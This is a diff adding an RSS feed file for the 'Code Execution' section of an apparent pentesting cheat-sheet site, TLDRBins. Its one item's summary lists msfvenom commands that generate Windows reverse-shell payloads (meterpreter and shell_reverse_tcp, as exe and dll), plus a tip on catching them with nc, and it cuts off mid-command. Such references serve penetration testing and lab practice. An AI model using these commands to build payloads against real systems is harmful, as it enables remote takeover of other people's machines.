@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Code Execution on TLDRBins</title>
+    <link>https://tldrbins.github.io/@code-execution/</link>
+    <description>Recent content in Code Execution on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@code-execution/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Metasploit Shellcode</title>
+      <link>https://tldrbins.github.io/metasploit_shellcode/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
+      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.dll Windows x86 Staged exe Stageless exe msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
+    </item>
+  </channel>
+</rss>
